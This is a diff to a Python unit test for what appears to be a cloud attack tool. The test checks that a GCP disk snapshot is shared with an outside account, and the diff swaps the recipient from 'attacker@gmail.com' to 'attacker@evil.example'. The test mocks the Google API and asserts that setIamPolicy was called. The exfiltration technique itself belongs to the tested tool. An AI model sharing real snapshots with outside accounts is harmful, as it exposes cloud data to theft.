@@ -61,7 +61,7 @@ def test_azure_exfil_success(mock_ctx):
 def test_gcp_exfil_success(mock_ctx):
     """Successfully share a GCP disk snapshot."""
     mock_ctx.provider_name = "gcp"
-    mock_ctx.params = {"target_id": "disk-1", "share_with": "attacker@gmail.com", "zone": "us-east1-a"}
+    mock_ctx.params = {"target_id": "disk-1", "share_with": "attacker@evil.example", "zone": "us-east1-a"}
     mock_ctx.whoami.return_value.account_id = "proj-1"
     
     with patch("googleapiclient.discovery.build") as mock_build:
@@ -73,5 +73,5 @@ def test_gcp_exfil_success(mock_ctx):
         result = execute(mock_ctx)
         
     assert result["results"][0]["status"] == "Shared"
-    assert result["results"][0]["exfil_path"] == "attacker@gmail.com"
+    assert result["results"][0]["exfil_path"] == "attacker@evil.example"
     mock_compute.snapshots().setIamPolicy.assert_called_once()
